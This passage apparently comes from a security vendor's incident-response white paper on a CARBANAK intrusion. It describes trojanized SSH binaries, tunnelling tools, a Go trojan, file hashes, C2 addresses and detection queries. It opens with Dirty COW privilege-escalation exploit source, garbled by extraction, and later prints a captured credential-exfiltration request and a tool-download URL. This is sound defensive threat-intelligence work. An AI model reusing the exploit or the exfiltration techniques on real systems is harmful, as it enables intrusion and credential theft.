@@ -1,0 +1,1067 @@
+
+
+
+Sentence : echo ‘trying...’
+killall -9 cow
+./cow &
+sleep 0.2
+fi
+done
+Figure 12: Contents of ‘1.sh’ Dirty COW Shell Script
+include 
+include 
+include 
+include 
+include 
+include 
+include 
+int f;
+void *map;
+pid_t pid;
+pthread_t pth;
+struct stat st;
+char suid_binary[] = “/usr/sbin/sshd”;
+unsigned char shell_code[] = “#!/tmp/x\n”;
+unsigned int sc_len = 9;
+void madviseThread(void arg) {
+int i,c=0;
+for(i=0;i<200000;i++)
+c+=madvise(map,100,MADV_DONTNEED);
+}
+int main(int argc,char *argv[]){
+f=open(suid_binary,O_RDONLY);
+fstat(f,&st);
+map=mmap(NULL,st.st_size+sizeof(long),PROT_READ,MAP_PRIVATE,f,0);
+pid=fork();
+if(pid){
+waitpid(pid,NULL,0);
+int i,o,c=0,l=sc_len;
+for(i=0;i<100000;i++)
+for(o=0;o<l;o++)
+c+=ptrace(PTRACE_POKETEXT,pid,map+o,((long)(shell_code+o)));
+}
+WHITE PAPER
+else{
+pthread_create(&pth,
+NULL,
+madviseThread,
+NULL);
+ptrace(PTRACE_TRACEME);
+kill(getpid(),SIGSTOP);
+pthread_join(pth,NULL);
+}
+return 0;
+}
+Figure 13: Contents of ‘c0w’ Dirty COW Source Code
+Figure 14: Observed Download of 1.sh and c0w from IP 185.61.148.145
+Both files were obtained via the legitimate WGET utility already present
+on the system. This would continue to be the attackers’ primary method of
+acquiring tools throughout this engagement. As such, the direct-to-IP address
+acquisition of tools before execution became an effective actionable IOC to
+track the adversary throughout this engagement. An example of this activity
+as seen in RSA NetWitness Logs and Packets is shown in Figure 15.
+Figure 15: WGET Download of SSHDoor Binary ssh
+19
+20
+WHITE PAPER
+4.2.2 SSHDoor Client and Server
+Shortly after successfully executing the downloaded privilege escalation
+code, the attackers again utilized WGET to download three additional
+binaries from IP address 95.215.46.116 named ssh, sshd and auditd . The ssh
+binary was a trojanized version of the OpenSSH 5.3p1 client binary, with the
+sshd binary a trojanized version of the server binary. These backdoors are
+variants of the SSHDOOR Trojan that was observed and reported in 2013. [15]
+While the previously observed SSHDOOR used an XOR scheme to store an
+SSH pre-shared key and its HTTP Request Format Strings, this version used
+RC4 encryption to store the same information. The decrypted SSH pre-shared
+key and HTTP Format Strings are shown in Figure 16.
+Figure 16: RC4 Decrypted authorized_keys Entry and HTTP Format Strings
+As was the case with the previous version of SSHDOOR, upon successful
+authentication using the client or server binary, the authenticated credentials
+are sent to the attacker via HTTP GET Request. In the case of these binaries,
+the source host’s MAC address would be normalized to lowercase and
+included in the first key-value pair of the URI, with the username, password
+and destination hostname and IP address encoded into a Base64 string and
+placed in the second key-value pair of the URI. These HTTP requests would
+15 Duquette; “Linux/SSHDoor.A Backdoored SSH daemon that steals passwords”; https://
+www.welivesecurity.com/2013/01/24/linux-sshdoor-a-backdoored-ssh-daemon-that-
+stealspasswords/
+21
+WHITE PAPER
+be sent to the C2 domains of centos-repo.org or slpar.org, depending on the
+version of the binary executed. An example of this is shown in Figure 17.
+GET
+/?cid=000c29450e28&text=cm9vdCAtPiBUaGlzSXNZb3VyUGFzc3dvcm
+Q6cm9vdEAxOTIuMTY4LjE2My4xODUK HTTP/1.0
+Host: centos-repo.org
+Red text = MAC address of affected system (lowercase normalized)
+Blue text = Base64 Username:Password representation.
+Decoded Base64 String:
+root -> ThisIsYourPassword:root@192.168.163.185
+Figure 17: Credential Harvesting HTTP Request
+Additionally, both versions of SSHDOOR allow unauthorized access when
+authenticated with the decrypted SSH pre-shared key. These trojanized binaries
+allowed the attackers to gain additional credentials that would assist them in
+moving laterally into the internal server environment. The authorized_hosts
+entry the attackers utilized with the SSHDOOR binary is shown in Figure 18.
+ssh-rsa
+AAAAB3NzaC1yc2EAAAADAQABAAABAQDAkqHYDX7rAoj6DNKLe4e
+7a7XFrbMRErtd6y/shqDaxSMMlXAfK6P2OQE9FmPPLDWjgkDgSyOvC0g
+TyghdGYdgKMV4DnhFiMMt4atOWwI86w71q9SEVGKKGVWLhIaCn
+GpWkWQmGGGnCOHbLezhLTnv98wscNdZLVafTOM/HqWkRcpr2XTO
+Phag/6FsXQsMKnJOZqloG5MWwdaYyIXBYEGRCA103MPmimW2jq
+Y91JxQ+7xEeD4XB1s9gNakHuQsDNNYY63kfiG8UAbOGQq
+88mpsB32Ofjz6qdAgYPzBZzCoMnvhtDSTyKPYjoeDEHXMWZU
+/3PZbjuejbM8v5F9FiH4p centos-repo.org
+Figure 18: Pre-Shared SSH Key Used by SSHDOOR
+The file information for the SSHDOOR client and server binaries with the C2
+address of centos-repo.org are shown in Table 1 and Table 2, respectively.
+File Name  : ssh
+File Size    : 1,180,393 bytes
+MD5       : 0810d239169a13fc0e2e53fc72d2e5f0
+SHA1      : 60a0c1042644cdc8189af1917cb14278f64f17e8
+Table 1: File Information for the SSHDOOR Client Binary (centos-repo.org)
+File Name  : sshd
+File Size    : 1,614,981 bytes
+MD5       : d66e31794836dfd2c344d0be435c6d12
+SHA1      : a065244522b6b26c033dfbc3383b93dba776c37d
+Table 2: File Information for the SSHDOOR Server Binary (centos-repo.org)
+22
+WHITE PAPER
+The file information for the SSHDOOR client and server binaries with the C2
+address of slpar.org are shown in Table 3 and Table 4, respectively.
+File Name  : ssh
+File Size    : 1,180,521 bytes
+MD5       : a365fd9076af4d841c84accd58287801
+SHA1      : ba2f90f85cada4be24d925cbff0c2efea6e7f3a8
+Table 3: File Information for SSHDOOR Client Binary (slpar.org)
+File Name  : sshd
+File Size    : 1,614,437 bytes
+MD5       : 9e2e4df27698615df92822646dc9e16b
+SHA1      : 96e56c39f38b4ef5ac4196ca12742127f286c6fa
+Table 4: File Information for SSHDOOR Server Binary (slpar.org)
+4.2.3 AudiTunnel
+The AUDITUNNEL binary is a reverse tunneling tool similar in functionality to
+netcat, but with support for multiple tunnels, Socks5 proxy and XOR encoded
+communication. It was downloaded, along with the SSHDOOR binaries from
+95.215.46.116, under the name ‘auditd.’ Upon execution, it creates a TCP socket
+and connects to C2 IP address 95.215.46.116 over TCP/443, creating a reverse
+tunnel to allow access to the victim server. Once the connection was made,
+AUDITUNNEL would keep the connection alive to allow inbound or outbound
+connectivity through this tunnel. In order to better hide its network activity,
+this utility would XOR all data passed through the tunnel with a key of 0x41.
+This binary is also able to communicate via the Socks5 protocol using Basic
+authentication. These three binaries proved to be the attackers’ primary method
+of ingress and credential harvesting for the first half of the incident. An example
+of the XOR network traffic associated with AUDITUNNEL is shown in Figure 19.
+Figure 19: XOR 0x41 Traffic for AudiTunnel
+WHITE PAPER
+After the attackers observed little change to their malware C2 channels
+once system ALPHA was remediated, the attackers quickly moved to system
+CHARLIE, the Linux Syslog server. This allowed them a communication
+channel to all other systems within the Linux environment, as well as allowing
+the attackers to control both centralized and local log entries across all Linux
+systems accessed. At this time, the attackers moved the majority of their
+toolset to CHARLIE, leaving only the SSHDOOR server binary on system
+ALPHA for further credential harvesting. The Syslog server would remain one
+of their primary staging points throughout the rest of the incident.
+The file information for AUDITUNNEL is shown in Table 5.
+File Name  : auditd
+File Size    : 21,616 bytes
+MD5       : b57dc2bc16dfdb3de55923aef9a98401
+SHA1      : 1d3501b30183ba213fb4c22a00d89db6fd50cc34
+Table 5: File Information for AUDITUNNEL
+4.3 LINUX SECONDARY ATTACKER TOOLS
+The attackers downloaded additional tools from IP address 95.215.46.116
+for the purposes of conducting internal reconnaissance and moving laterally
+between the Linux and Windows environments. These tools included the
+WINEXE version 1.1 remote command execution utility, a version of the
+ALW “Advanced Log Wiper” posted by “security40bscurity at 0xbscured.net”
+posted to Pastebin on July 7, 2015, and SecPoint’s PSCAN multithreaded IP
+port scanner. With these tools, the attackers traversed the internal network
+beginning with the shortest hop points first and migrating outward. Example
+executions of each of these tools are shown in Figure 20 through Figure 23.
+4.3.1 Winexe
+WINEXE is the Windows Remote Command Execution tool for Linux. Its
+functionality is very similar to that of SysInternals PSEXEC, including the
+creation of a Windows service and file transfer of a service binary into the
+ADMIN$ Windows SMB shared location (C:\Windows). As is described in Figure
+20, the command line options are very similar to that of PSEXEC as well.
+23
+24
+WHITE PAPER
+Figure 20: Usage Message for WINEXE Binary
+The file information for WINEXE is shown in Table 6.
+File Name  : winexe
+File Size    : 8,126,714 bytes
+MD5       : edce844a219c7534e6a1e7c77c3cb020
+SHA1      : 286bf53934aa33ddf220d61c394af79221a152f1
+Table 6: File Information for WINEXE
+4.3.2 ALW (Advanced Log Wiper, “l”)
+The ALW Advanced Log Wiper was initially downloaded to system BRAVO
+early in the intrusion as a method of removing specific indications of
+attacker activities from Linux host logs. ALW was originally written by
+“security40bscurity” and posted to Pastebin on July 7, 2015. This binary takes
+WHITE PAPER
+four arguments: the user to remove from the target logs, the host to remove
+from the target logs, a specific terminal TTY value to remove from the target
+logs, or a specific target log file to remove. The usage message for this binary
+is shown in Figure 21.
+Figure 21: Usage Message for l Advanced Log Wiper
+If no file argument is given, ALW will remove all log entries with the specified
+user, host or TTY from the following logs:
+Table 7: Logs Modified by ALW Log Wiper
+The file information for ALW is shown in Table 8.
+File Name  : l
+File Size    : 16,333 bytes
+MD5       : 771fa63231fb42ee97aa17818a53f432
+SHA1      : 149a9270d9160120229b7c088975c2754e3b5333
+Table 8: File Information for ALW
+4.3.3 PSCAN
+The PSCAN binary found on host BRAVO is a TCP port scanning tool that
+attempts to create TCP socket connections to a specified port for every IP
+within a specified range. This functionality allows the attacker to check if
+specific commonly used ports are open for communication in systems within
+an IP range, thereby identifying available services for internal reconnaissance.
+The usage message for PSCAN is shown in Figure 22.
+25
+26
+WHITE PAPER
+Figure 22: Usage Message for PSCAN Port Scanning Tool
+An example execution of PSCAN is shown in Figure 23, with the file
+information for this binary shown in Table 9.
+Figure 23: Example Usage of PSCAN Port Scanning Tool
+File Name  : pscan
+File Size    : 10,340 bytes
+MD5       : 0f1c4a2a795fb58bd3c5724af6f1f71a
+SHA1      : 039f814cdd4ac6f675c908067d5be1d6f9acc31f
+Table 9: File Information for PSCAN
+Their decisions in which systems to access indicated that their next intended
+action was to gain access to the Windows Server environment. The attackers
+continued to conduct internal reconnaissance within both the Linux and
+Windows environments using stolen credentials to access Linux systems via
+SSH and the WINEXE utility to access Windows systems. The actions-on
+objective during this time was composed of mapping the internal network
+with the PSCAN utility and collecting host information via resident Linux and
+Windows administrative command-line utilities.
+4.4 WINDOWS COMPROMISE AND MALICIOUS FILES
+4.4.1 GOTROJ Remote Access Trojan
+On D+30, the attackers installed a Windows Trojan, written in Go, as a
+Windows Service on one of the two primary Active Directory Domain
+Controllers. They would move to utilizing the GOTROJ as their primary
+method of ingress for the duration of the engagement. The GOTROJ Trojan
+communicated with C2 IP address 107.181.246.146 over TCP/443 for its
+remote access channel. This Trojan was much more fully featured than the
+|Command|Function|
+|---|---|
+|#ps|Display process listing|
+|#shell|Begin interactive command shell|
+|#kill|Remove Windows Service and Malware|
+|#info|Get system information|
+|#wget|Download function via wget HTTP|
+|#wput|Upload function via wput FTP|
+|#name|Get hostname of victim|
+|#service|Install malware as Windows Service withService Name of ‘WindowsCtlMonitor’|
+27
+WHITE PAPER
+previous tools utilized by the attackers to this point, with eight primary
+functions designated by a command issued by the attackers. The commands
+and their functionality are shown in Table 10.
+Table 10: Decoded Commands for GOTROJ Trojan
+The commands are stored within the binary in an XOR encrypted segment,
+which is decrypted shortly after execution with the XOR key of ‘dmdar,’ or
+0x646D646172. The section of code which calls the c_gosh_xstr_XorCrypt()
+function to decrypt the commands is shown in Figure 24.
+Figure 24: XOR Command Decryption Method
+This binary operates in one of two modes. The first is an ad hoc, interactive
+execution mode, in which the malware executes within the context of a
+user account. However, if the malware is executed as a user, there has to
+28
+WHITE PAPER
+be a file named ‘ xname.txt ’ in that user’s temporary directory referenced by
+the environment variable ‘%TEMP%.’ As this file was not found during this
+engagement and is not dropped by any of the tools used by the attackers, its
+contents are not known. However, when the malware begins to communicate
+with its C2, the contents of the file are the first thing encrypted and sent to
+the C2 server. The second method of GOTROJ utilization is execution under a
+Windows Service as a method of persistence. The attackers used this method
+of execution during this engagement, installing the GOTROJ binary as a
+service named WindowsCtlMonitor .
+The network communication protocol this malware uses contains a very
+simplistic, but specific, header and format. The traffic sent and received
+by this malware is XOR encrypted with an XOR key that changes for every
+message sent or received. An example of the format in its encrypted form is
+shown in Figure 25.
+Figure 25: Annotated Encrypted Form of GOTROJ Communication
+Once decrypted with the XOR key (byte BA in the example above), the
+formatting of the message becomes considerably clearer. An illustration of
+this is shown in Figure 26.
+Figure 26: Annotated Decrypted Form of GOTROJ Communication
+Given this simplistic method of formatting and decryption, RSA analysts were
+able to effectively decrypt this traffic for review during the investigation,
+greatly increasing visibility into attacker actions. However, given that this
+malware utilizes a TCP socket connection for transport communications
+in a tunneling form, the custom communications protocol does not take
+packet boundaries into account in its design. Therefore, a single message
+may traverse multiple packets with no additional control bytes, such as the
+ID byte or length. Given this case, the method of decrypting the traffic was
+made more effective by extracting the payload above Layer 4 and decrypting
+that data independent of any data within Layers 2-4. The file information
+WHITE PAPER
+for the three versions of GOTROJ observed in this incident is shown in
+Table 11, Table 12 and Table 13. All binaries use the same C2 IP address of
+107.181.246.146 .
+File Name  : ctlmon.exe
+File Size    : 4,392,448 bytes
+MD5       : 370d420948672e04ba8eac10bfe6fc9c
+SHA1      : 450605b6761ff8dd025978f44724b11e0c5eadcc
+Table 11: File Information for GOTROJ Version 1
+File Name  : ctlmon_v2.exe
+File Size    : 4,047,691 bytes
+MD5       : 5ddf9683692154986494ca9dd74b588f
+SHA1      : 08f527bef45cb001150ef12ad9ab91d1822bb9c7
+Table 12: File Information for GOTROJ Version 2
+File Name  : ctlmon_v3.exe
+File Size    : 4,063,744 bytes
+MD5       : f9766140642c24d422e19e9cf35f2827
+SHA1      : 7b27771de1a2540008758e9894bfe168f26bffa0
+Table 13: File Information for GOTROJ Version 3
+4.4.2 AudiTunnel (Windows Version)
+The attackers also utilized a tunneling binary similar to the AUDITUNNEL
+binary used on the compromised Linux systems. The svcmd.exe binary’s
+primary purpose was to tunnel traffic to the attackers’ C2 using XOR
+encoding with a key of 0x41. This version of AUDITUNNEL is hard-coded
+to communicate with IP 185.86.151.174 . The C2 IP address is clearly seen
+within the ASCII strings of the file, as shown in Figure 27.
+Figure 27: C2 IP Address in ASCII Strings of svcmd.exe
+The IP address it communicates with is hard-coded, as is the encryption
+key used for its communications. After establishing the TCP connection
+and socket, svcmd.exe will XOR the send and receive buffers against a value
+of 0x41. Given it connects to the C2 IP address over TCP/443, without the
+necessary visibility, defenders might mistake it for HTTPS encrypted traffic.
+The encryption code segment is shown in Figure 28.
+29
+WHITE PAPER
+The encryption code segment is shown in Figure 28.
+Figure 28: XOR Byte Encryption Loop for Send and Receive Buffer
+The file information for the Windows AUDITUNNEL binary is shown in Table 14.
+File Name    : svcmd.exe
+File Size    : 47,104 bytes
+MD5       : 8b3a91038ecb2f57de5bbd29848b6dc4
+SHA1      : 54074b3934955d4121d1a01fe2ed5493c3f7f16d
+Table 14: File Information for AUDITUNNEL (Windows Version)
+4.5 WINDOWS SECONDARY ATTACKER TOOLS
+4.5.1 TINYP
+While the WINEXE binary was used to migrate from the Linux environment
+to the Windows environment, a modified version of SysInternals PSEXEC
+was used to move throughout the Windows environment. This modified
+PSEXEC binary, named TINYP by the attackers, was the primary lateral
+movement mechanism. Two versions of TINYP were used during this
+intrusion (v.0.7.6.2 and v.0.7.7.4), with the attackers downloading the binaries
+under the filenames ti1.bmp, tinyp1.bmp, tinyp2.bmp, tineyp3.bmp, tinyp4.bmp
+and ps.bmp . Once downloaded, the binary was renamed to ps.exe for use in
+lateral movement. While both versions of TINYP have all of the features of
+normal SysInternals PSEXEC, they also include additional functionality. These
+functionalities are given at the command line at execution, just like PSEXEC.
+The usage list of all of TINYP’s functions is shown in Table 15.
+30
+WHITE PAPER
+|Argument|Function|
+|---|---|
+|\|Remote system to communicate with|
+|-e|Do not load user profle on target host|
+|-copyself|Copy TINYP to C:\Windows on target host|
+|-cleanup|Delete System Event Log|
+|-getfles |Download fles from target host|
+|-copyfles |Upload fles to target host $ADMIN share|
+|-d|Run command non-interactively|
+|-i |Run command interactively to |
+|-u |Username fag|
+|-p |Password fag|
+|-s|Run as SYSTEM on target host|
+||Command to run on the target host.Running cmd gives interactive shell|
+Table 15: TINYP Arguments and Functions
+The primary modifications made to the base SysInternals PSEXEC are the
+functions associated with the –copyself, –cleanup, –getfiles, and –copyfiles
+arguments. The –copyself and –copyfiles arguments will copy a file to the
+target remote system via SMB/CIFS, with that file either being a copy
+of TINYP itself or an explicitly designated file, respectively. The –getfiles
+argument will move files in the opposite direction, downloading specified
+files from the target remote host to the source host via SMB/CIFS. Lastly,
+the TINYP tool contains an argument to specifically delete entries from the
+Windows System Event Log. While this is an attempt to cover tracks as the
+attacker moves throughout the environment, it is important to note that this
+only affects the System Event Log, leaving Application, Security and servicespecific Windows Event Logs to retain data useful to investigators.
+The TINYP tool was used primarily with the Windows Command Processor
+cmd.exe as the final argument for remote command shell access. Once the
+attacker closed the remote session, the TINYP tool would:
+
+Check if it copied itself to the $ADMIN share of the remote system (C:\
+
+Windows). If so, it would delete itself from that location.
+
+Remove the PSEXESVC Windows Service and the psexesvc.exe PSEXEC
+
+Remote Service binary from the remote system.
+
+Delete the System Event Log from the remote system.
+
+31
+WHITE PAPER
+Evidence of this activity, in the form of a lab execution of this tool, is shown in
+Figure 29.
+Figure 29: Sample Execution of TINYP v.0.7.7.4
+The file information for TINYP versions 0.7.6.2 and 0.7.7.4 is shown in Table
+16 and Table 17, respectively.
+File Name  : TINYP2.bin
+File Size    : 277,504 bytes
+MD5       : 7393cb0f409f8f51b7745981ac30b8b6
+SHA1      : 6c17113f66efa5115111a9e67c6ddd026ba9b55d
+Table 16: File Information for TINYP v.0.7.6.2
+File Name : ps.exe
+File Size   : 234,496 bytes
+MD5       : c4d746b8e5e8e12a50a18c9d61e01864
+SHA1      : c020f8939f136b4785dda7b2e4b80ced96e23663
+Table 17: File Information for TINYP v.0.7.7.4
+4.5.2 WGET (UIAUTOMATIONCORE.DLL.BIN)
+As done previously, the attackers used WGET version 1.11.4 to download
+binaries before execution. However, the WGET used was renamed to
+UIAutomationCore.dll.bin . Evidence of this is shown in execution of the binary
+in Figure 30.
+32
+WHITE PAPER
+Figure 30: WGET Renamed to UIAutomationCore.dll.bin
+This binary is observed downloading a version of the TINYP tool from IP
+address 185.61.148.145 in the RSA NetWitness Endpoint Application
+Tracking Data shown in Figure 31.
+ECATSERVER,AGENT_HOSTNAME,2017-05-02
+12:51:43.0671260,UIAutomationCore.dll.bin,TINYP2.bmp,C:\
+Windows\SysWOW64\zh-TW\,NULL,UIAutomationCore.dll.bin
+http://185.61.148.145:443/TINYP2.bmp
+Figure 31: Download of TINYP Binary with UIAutomationCore.dll.bin
+The file information is shown in Table 18.
+File Name  : UIAutomationCore.dll.bin
+File Size    : 401,408 bytes
+MD5       : bd126a7b59d5d1f97ba89a3e71425731
+SHA1      : 457b1cd985ed07baffd8c66ff40e9c1b6da93753
+Table 18: File Information for WGET (UIAutomationCore.dll.bin)
+4.5.3 PSCP (PuTTY Secure File Copy)
+The PSCP tool used by the attackers was an unmodified version of PuTTY’s
+Secure File Copy v0.67. The file information is shown in Table 19.
+File Name  : pscp.bin
+File Size    : 359,336 bytes
+MD5       : b3135736bcfdab27f891dbe4009a8c80
+SHA1      : 9240e1744e7272e59e482f68a10f126fdf501be0
+Table 19: File Information for PSCP
+4.5.4 Mimikatz Variant (32-bit, 64-bit)
+For credential harvesting within the Windows environment, the attackers
+downloaded two files named image32.bmp and image64.bmp . These files
+were subsequently renamed to xxx32.exe and xxx64.exe, respectively. In
+reviewing these files and their activity, RSA IR determined that these were
+implementations of the sekurlsa_acquireLSA() functionality of the Mimikatz
+credential harvesting tool. The file information is shown in Table 20 and
+Table 21.
+33
+WHITE PAPER
+File Name  : xxx32.exe
+File Size    : 528,896 bytes
+MD5       : 6499863d47b68030f0c5ffafaffb1344
+SHA1      : 2197e35f14ff9960985c982ed6d16d5bd5366062
+Table 20: File Information for MIMIKATZ Variant (32-bit)
+File Name  : xxx64.exe
+File Size    : 589,312 bytes
+MD5       : 752d245f1026482a967a763dae184569
+SHA1      : 355603b1922886044884afbdfa9c9a6626b6669a
+Table 21: File Information for MIMIKATZ Variant (64-bit)
+4.5.5 CCS
+CCS is a system process and library identifier that, when no arguments are
+given, will print the currently running processes and their process IDs to both
+STDOUT and a file named __out.log_ in the current working directory. If CCS
+executed with the “modules” argument, it printed the running processes and
+their process IDs, as well as all DLLs loaded by each process. This operation
+also prints the output to both STDOUT and the __out.log_ file. Additionally,
+the __out.log_ file will not be replaced; rather, it will be appended with every
+subsequent execution. The file information is shown in Table 22.
+File Name  : ccs.bmp
+File Size    : 82,944 bytes
+MD5       : d406e037f034b89c85758af1a98110be
+SHA1      : 6bc46528da6cd224fa5e58ccd9df5b05c46c673d
+Table 22: File Information for CCS
+4.5.6 Infos.bmp
+The INFOS tool was a host reconnaissance tool obtaining browser history,
+browser login data and RDP logs from the system, and it outputs them to
+STDOUT. The attackers used this tool to harvest credentials, identify internal
+web applications and observe the common RDP connections and accounts
+used on the Windows servers. The file information is shown in Table 23.
+File Name  : infos.bmp
+File Size    : 494,080 bytes
+MD5       : ab8bed25f9ff64a4b07be5d3bc34f26b
+SHA1      : 42ce9c2bd246a0243fa91309938042e434b39876
+Table 23: File Information for INFOS
+34
+35
+WHITE PAPER
+4.5.7 PSCAN (Windows Version)
+The attackers also utilized a version of the PSCAN tools described in Section
+4.3.3. This version differs from the Linux version previously discussed only in
+its usage message, which is slightly more verbose. An example of the usage
+text and execution is shown in Figure 32.
+Figure 32: Example Execution and Usage Text of Windows Version of PSCAN
+The file information is shown in Table 24.
+File Name  : pscan.bmp
+File Size    : 65,024 bytes
+MD5       : d825fbd90087d2350e89cbf205a1b71c
+SHA1      : ca5e195692399dca99a4d8299dc9ff816168a6dc
+Table 24: File Information for PSCAN (Windows Version)
+4.6 DETECTION, TRACKING, AND RESPONSE
+Given that the attackers left very little consistently running on any
+compromised host, downloaded tools as they needed them and removed
+those tools immediately after use, determining their movement throughout
+the environment via traditional forensic methods was not a timely option.
+In a significant portion of the attackers’ actions-on-objective and lateral
+movement, the majority of their activity was contained within the functions of
+the Windows Command Processor cmd.exe . Given this, much of their actions
+did not cause subsequent process execution. Additionally, the attackers
+utilized several different filenames for their toolsets, ensured a tool was not
+executed with the same name it was downloaded with, used multiple versions
+to throw off atomic hashing IOCs and maintained at least two different
+ingress points with non-related IP addresses.
+Given that the attackers had been in the environment for over a month at the
+time response began, traditional host and network intrusion detection systems
+within the organization’s security stack proved ineffective to combat these
+actors. Additionally, the attackers had full access to the Linux and Windows
+environments at the time of response. However, by engaging and enabling
+analysts to periodically conduct RSA Threat Hunting with a solid methodology,
+36
+WHITE PAPER
+this threat was still detected despite not being detected by IDS, or buried in
+ineffective alerts. Once detected, the root cause was determined, the threat
+was effectively and recursively scoped across the environment, additional
+next-level visibility into attacker actions was obtained, and a plan was created
+and executed to successfully remediate the threat. Given that time is the
+most critical resource during incident response, any reduction to the 10:1
+analysis time versus attack time ratio can significantly increase the chances of a
+successful eradication event and continued successful remediation. In this case,
+due to effective visibility, solid methodology and processes, and motivated
+and properly enabled analysts, the threat was contained and remediated after
+nine days of response efforts. The remediation involved significant internal
+infrastructure changes be enacted before the expulsion event, including
+implementation of redesigned network segmentation, replacement of several
+significant environment-wide data and process automations, and removal
+and replacement of most administrative authentication methods within the
+environment. Consistent monitoring and RSA Threat Hunting operations
+conducted post-remediation, with the necessary visibility, allowed for an active
+and adaptive response in which any subsequent actor activity was observed,
+analyzed and responded to appropriately.
+With the care in which the attackers moved throughout the environment, RSA
+IR relied on RSA NetWitness Endpoint and RSA NetWitness Logs and Packets
+to coordinate host and network visibility and create non-standard, aggregate,
+behavioral-based indicators, resulting in actionable IOCs that allowed RSA
+IR to track the attackers in near real time. Here, we discuss some of the ways
+in which RSA IR was able to determine and track attacker actions throughout
+the environment.
+4.6.1 Network Visibility and Indicators
+This section discusses the methodology and RSA NetWitness Suite queries
+and content used by RSA IR during this investigation. The methodology in this
+section uses the OCOKA defensive model [16] and is described in detail in the
+RSA Incident Response NetWitness Hunting Guide. [17]
+The CARBANAK attackers conducted actions through a variety of network
+communication methods. Additionally, as the attackers were prone to
+downloading tools when they needed them, in an effort to leave as little
+on disk as possible, this became a primary method of tracking attacker
+location throughout the environment. The attackers primarily used WGET to
+download tools when needed, and they consistently did so directly to an IP
+address over TCP port 443.
+16 Heuser, Riley; “The Myth of the Easy Button Approach to Information Security”; https://www.
+rsa.com/en-us/blog/2017-07/infosec-easy-button-myth
+17 “RSA Incident Response NetWitness Hunting Guide”; https://community.rsa.com/docs/DOC-62341
+37
+WHITE PAPER
+Therefore, using the following query would reduce the dataset to the attacker
+activity with considerably high fidelity:
+direction = outbound && service = 80 && client begins ‘wget’ && tcp.dstport = 443
+&& service.analysis = ‘direct to ip http request’
+Execution of this query against the network dataset resulted in the following
+sessions, shown in Figure 33.
+Figure 33: Query Results for Malicious Tool Downloads
+This behavioral IOC could also be modified to adhere to changes in attacker
+actions or increasing false positives by including the Directory Meta to only
+equal the root directory, or include the Action Meta to only include HTTP GET
+Requests. As we see in Figure 33, though the attackers would keep changing
+filenames, IP addresses and WGET versions used, actions associated with this
+TTP were still able to be detected throughout the engagement.
+The primary method of interacting with the Linux Syslog server within the
+Linux environment consisted of communicating via SSH over a reverse tunnel
+(created by the AUDITUNNEL binary). Given that the SSH traffic would be
+encapsulated within the reverse tunnel created by AUDITUNNEL, the Layer
+3 and Layer 4 headers would be representative of the tunnel itself, while the
+38
+WHITE PAPER
+network payload above Layer 4 would be representative of the SSH protocol.
+With this knowledge, we can begin to build behavioral IOC queries to track
+this activity, beginning with the following:
+direction = outbound && service = 22
+This query will return all results representative of both outbound SSH
+communication as well as inbound SSH communication over the reverse
+tunnel. However, this query is of particularly low fidelity, especially when
+in a Linux-heavy environment. By reviewing additional context around
+what we know of this attacker communication, this query can be narrowed
+significantly. In reviewing the activity associated with the AUDITUNNEL
+auditd and svcmd.exe tunneling binaries, both communicate outbound over
+TCP port 443. Adding this to our query gives additional context around the
+transport mechanism, though not the communication mechanism (SSH).
+As the SSH attacker traffic is associated with the SSHDOOR trojanized
+OpenSSH 5.3 binaries, and by specification SSH exchanges client and server
+version strings at the beginning of each session, we can add version context
+to the communication mechanism as well. The addition of these two aspects
+results in the following query:
+direction = outbound && service = 22 && tcp.dstport = 443 && client = ‘openssh_5.3’
+Execution of this query against the network dataset returns the following
+results, as shown in Figure 34.
+Figure 34: Tunneled SSH Query Results
+WHITE PAPER
+In the resulting data, we observe that in all sessions returned, the client
+version string and the server version string match. This can be added to
+the query to increase the fidelity of the IOC if there are still false positives
+present. However, there is still the case in which the AUDITUNNEL binary
+utilizes the XOR encoding. In this case, the traffic will appear as binary
+network communications. In order to ease the effort of detecting this
+activity, content for RSA NetWitness Logs and Packets were created based
+on the initial ‘Client Hello’ string passed when beginning AUDITUNNEL XOR
+communication. An example of this detection is shown in Figure 35.
+Figure 35: AUDITUNNEL ‘Client Hello’ Payload Detection and Meta
+The GOTROJ utilized two methods of network communication. The first and
+primary method was a custom binary XOR encoded protocol communicating
+outbound over TCP port 443. We can begin building our IOC query here with
+the following:
+direction = outbound && risk.info = ‘unknown service over ssl port’ && tcpflags =
+‘syn’ && ioc = ‘binary handshake’
+This query will identify the beginning of all outbound communications
+over TCP port 443 in which data is being transmitted by both parties at the
+beginning of the communication ( ioc = ‘binary handshake’ ). While this will
+find the GOTROJ control traffic, it will find many other things as well. This is
+due to service = 0 being representative of any protocol for which there is not
+an RFC standard parser built. This includes various proprietary protocols,
+malicious custom protocols and even sending cleartext over a network tunnel.
+To narrow this down some, we would want to look at byte transmission ratios
+between the payloads of the communication. What we are really looking for is
+conversational traffic, in which the ratio of the amount of data transmitted by
+both parties is roughly equivalent (25-75% or so). To identify this, we would
+add the Session Analysis Meta for this type of byte transmission ratio, as
+shown below:
+direction = outbound && risk.info = ‘unknown service over ssl port’ && tcpflags = ‘syn’
+&& ioc = ‘binary handshake’ && analysis.session = ‘medium transmitted outbound’
+The direction meta can be removed in this instance if necessary, as the medium
+transmitted outbound meta includes the condition. The resulting traffic from
+the network dataset is shown in Figure 36.
+39
+40
+WHITE PAPER
+Figure 36: GOTROJ Binary Control Traffic and svcmd.exe Beacon Traffic
+At this point in the analysis, we want to look at any contextually interesting
+meta within the analysis, compromise or risk meta groups. In Figure 36, meta is
+created on these sessions for ‘ xor encoded executable ’ and ‘ windows cli admin
+commands. ’ This indicates that RSA NetWitness Suite observed a Windows
+executable file in the network traffic that was XOR encrypted with a onebyte key. Adding this meta to the ‘ windows cli admin commands ’ indicates that
+common Windows administrative command line utilities, such as ‘whoami,’
+‘ipconfig’ or the command prompt string ‘C:\Windows\system32>,’ were
+observed either in cleartext or one-byte XOR encrypted. In extracting the
+payload and performing the XOR instruction with a key of 0xC0, we observe
+the command prompt string, as shown in Figure 37.
+Figure 37: Identification of Windows Command Prompt in
+XOR 0xC0 Decrypted Payload
+While this query may include additional traffic not associated with the
+attackers, it allowed RSA IR to significantly reduce the network dataset to a
+level where any included traffic could be quickly reviewed for newly identified
+C2 IP addresses or false positive IP addresses that required filtering. In order
+to more accurately observe this communication, RSA IR created custom
+content for RSA NetWitness Suite. This content is released in the form of the
+Digital Appendix associated with this report. An example of the meta created
+for this communication is shown in Figure 38.
+41
+WHITE PAPER
+As discussed earlier in this paper, the GOTROJ has the ability to download
+files to compromised hosts. This ability does not traverse the binary XOR
+encoded control channel of the GOTROJ . Instead, it utilizes HTTP over TCP
